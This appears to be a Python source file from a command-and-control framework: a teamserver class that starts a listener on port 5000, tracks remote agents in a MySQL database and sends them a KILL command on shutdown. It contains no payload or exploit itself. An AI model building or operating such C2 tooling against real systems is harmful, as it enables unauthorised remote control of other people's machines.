from teamserver import db
from server import listener, c2

from termcolor import colored
from os import system
from threading import Thread
from tabulate import tabulate

class Teamserver:
    def __init__(self):

        try:
            self.agentDB = db.DB()
            system('clear')

        except Exception:
            print(colored("[-] Problem connecting to the MySQL DB! \n"
            " Make sure that the credentials entered are correct/MySQL Server is running. \n"
            " Exiting...", 
                "red"))
            exit()
        
        print("[!] Listening for traffic on port 5000")
        self.thread = Thread(target=listener.start, args=[self.agentDB], daemon=True)
        self.thread.start()      
        system('clear') 


    def getDBObj(self):
        return self.agentDB


    #display the board of active c2s, call again to refresh
    def displayBoard(self, all=True, interactType="", id=""):
        if interactType == "agent":
            interactType = "agentID"

        if all:
            data = self.agentDB.dbPull()
        else:
            data = self.agentDB.pullSpecific(interactType, id)

        if len(data) == 0:
            print(colored("[-] No Agents in DB!\n", "red"))
            return

        d = []
        for entry in data:
            d.append(entry)
        
        print("\n")
        print(colored(tabulate(data, headers=["Agent IP", "OS", "Service", "Status", "Last Ping"], tablefmt="fancy_grid"), "magenta"))
        print("\n")
    
    
    def printOutput(self): 
        pass #TODO print command output
        #take into account single/group (one/many) command responses

    def shutdown(self):
        if input("Confirm shutdown (y/n) ") == "y":
            print(colored("\n[*] Sending KILL Reference to all agents...\n", "yellow"))
            c2.sendRefCMD(self, "all", "", "KILL")
            
            # print(colored("\n Cleaning up...\n", "yellow"))
            self.agentDB.cleanDB()
            

            print("\nThe right man in the wrong place can make all the difference in the world.\nSo, wake up, Mr. Freeman. Wake up and smell the ashes.\n")
            exit(0)